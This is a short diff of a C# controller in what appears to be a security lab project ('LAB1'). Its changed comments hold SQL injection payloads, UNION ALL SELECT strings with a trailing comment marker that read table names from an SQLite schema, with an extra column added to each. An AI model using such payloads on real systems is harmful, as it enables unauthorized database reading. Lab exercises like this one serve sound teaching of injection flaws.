@@ -43,8 +43,8 @@ namespace LAB1.Controllers
             //rx.Replace(find, "replacment");
             //https://regex101.com/
             
-            // ' UNION ALL SELECT '6', '2022-03-02', name, '2', null FROM sqlite_schema --
-            // ' UNION ALL SELECT rootpage, '2022-03-02', name, '2', null FROM sqlite_schema --
+            // ' UNION ALL SELECT '6', '2022-03-02', name, 'dsds', '2', null FROM sqlite_schema --
+            // ' UNION ALL SELECT rootpage, '2022-03-02', name, 'dsds', '2', null FROM sqlite_schema --
 
             ViewBag.ID = id;
             ViewBag.find = find;
